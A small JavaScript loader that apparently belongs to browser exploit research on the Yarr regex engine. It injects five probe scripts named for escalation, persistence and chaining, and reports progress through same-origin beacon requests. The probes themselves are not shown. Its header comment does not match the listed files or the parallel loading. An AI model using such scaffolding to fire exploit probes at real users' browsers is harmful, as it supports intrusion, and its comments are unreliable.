// p237 — Yarr C3 mega probe: loads p233 through p236 sequentially
// One page refresh → all C3 escalation probes fire
// Beacons: V233-*, V234-*, V235-*, V236-*

(function() {
  var B = "V237-";
  function beacon(tag) {
    try { new Image().src = "/BEACON?" + B + tag + "&t=" + Date.now(); } catch(e) {}
  }

  beacon("MEGA-START");

  var probes = [
    "p236-yarr-c3-persist.js",
    "p238-yarr-c3-chain.js",
    "p234-yarr-c3-success.js",
    "p235-yarr-c3-surrogcap.js",
    "p233-yarr-c3-escalate.js"
  ];

  var loaded = 0;
  for (var i = 0; i < probes.length; i++) {
    try {
      var s = document.createElement("script");
      s.src = probes[i] + "?v=" + Date.now();
      s.onload = function() {
        loaded++;
        beacon("LOADED-" + loaded);
        if (loaded === probes.length) beacon("MEGA-ALL-DONE");
      };
      s.onerror = function(e) {
        beacon("LOADERR-" + this.src.split("/").pop().slice(0,20));
      };
      document.body.appendChild(s);
    } catch(e) {
      beacon("SCRIPTERR-" + i);
    }
  }

  beacon("MEGA-QUEUED-" + probes.length);
})();
